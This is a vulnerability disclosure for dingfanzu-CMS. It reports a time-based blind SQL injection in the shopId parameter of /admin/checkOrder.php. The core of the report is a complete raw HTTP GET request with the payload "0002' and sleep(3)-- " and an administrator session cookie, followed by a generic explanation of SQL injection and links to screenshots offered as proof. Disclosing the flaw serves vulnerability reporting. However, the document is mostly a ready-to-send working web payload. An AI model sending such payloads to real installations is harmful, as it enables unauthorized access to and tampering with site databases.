# dingfanzu-CMS checkOrder.php shopId SQL-inject

**Exploit Title: dingfanzu-CMS checkOrder.php shopId SQL inject**

**Exploit Author: https://github.com/xiaosguang/cve/blob/main/dingfanzu**

**Vendor Homepage: https://github.com/geeeeeeeek/dingfanzu**

**Software Link: https://github.com/geeeeeeeek/dingfanzu**

**CMSName: dingfanzu-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection dingfanzu-CMS does not filter the content correctly at the "checkOrder.php" shopId module, resulting in the generation of SQL injection.

The path to the vulnerability：/admin/checkOrder.php?shopId=

    Payload used:

```
GET /admin/checkOrder.php?shopId=0002'+and+sleep(3)--+ HTTP/1.1
Host: dingfanzu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: adminId=16; adminName=liu; shopId=1000; Hm_lvt_9bb651f2bb5622d49b0299560d6559cd=1736094869; HMACCOUNT=74321D4C60CCF393; PHPSESSID=su7te2f8aq0m0hg3ukdbf7ouqm; places=%5B%7B%22shopId%22%3A%221000%22%2C%22shopName%22%3A%22%5Cu9f50%5Cu9c81%5Cu5927%5Cu53a6%22%7D%2C%7B%22shopId%22%3A%221001%22%2C%22shopName%22%3A%22%5Cu6e56%5Cu5317%5Cu5927%5Cu53a6%22%7D%5D; userId=aaa1; shopInfo=%7B%22shopId%22%3A%221001%22%2C%22shopName%22%3A%22%E6%B9%96%E5%8C%97%E5%A4%A7%E5%8E%A6%22%2C%22shopPhone%22%3Anull%2C%22shopTip%22%3A%22%E5%93%88%E5%93%88%22%2C%22shopState%22%3A%221%22%2C%22shopIcon%22%3A%221001.jpg%22%2C%22shopBlock%22%3A%22%3F%23A%23B%23%22%2C%22shopFloor%22%3A%22%3F%231%232%233%22%7D; cart1001=%5B%7B%22itemId%22%3A%221685431107987%22%2C%22name%22%3A%22%5C%5Cu897f%5C%5Cu7ea2%5C%5Cu67ff%5C%5Cu7092%5C%5Cu9e21%5C%5Cu86cb%22%2C%22count%22%3A1%2C%22price%22%3A%2211%22%7D%5D; myInfo=%7B%22userId%22%3A%22aaa1%22%2C%22paymethod%22%3A%220%22%2C%22pn%22%3Anull%2C%22name%22%3Anull%2C%22place%22%3A%22%22%2C%22block%22%3Anull%2C%22floor%22%3Anull%2C%22jifen%22%3Anull%2C%22email%22%3Anull%2C%22price%22%3A%220%22%2C%22orderArrivedTime%22%3A%221%3A30-2%3A00%22%2C%22orderRemark%22%3A%22%22%7D; cart0001=%5B%7B%22itemId%22%3A%221466524398193%22%2C%22name%22%3A%22%5C%5Cu5bab%5C%5Cu4fdd%5C%5Cu9e21%5C%5Cu4e01%5C%5Cu002b%5C%5Cu9e21%5C%5Cu86cb%5C%5Cu7092%5C%5Cu9ec4%5C%5Cu74dc%5C%5Cu002b%5C%5Cu897f%5C%5Cu7ea2%5C%5Cu67ff%5C%5Cu6284%5C%5Cu725b%5C%5Cu8169%22%2C%22count%22%3A1%2C%22price%22%3A%2215%22%7D%5D; shopId=1001; Hm_lpvt_9bb651f2bb5622d49b0299560d6559cd=1736099897
Connection: keep-alive


```



## Proof of Concept

The code does not validate the input data and does not use precompilation technology


![image-20250106015104794](https://github.com/user-attachments/assets/2780414f-c453-4396-b332-3b054080ccb6)



Practical verification

![image-20250106021003686](https://github.com/user-attachments/assets/656d9fab-e036-4d83-9bf0-06a19b94a48c)
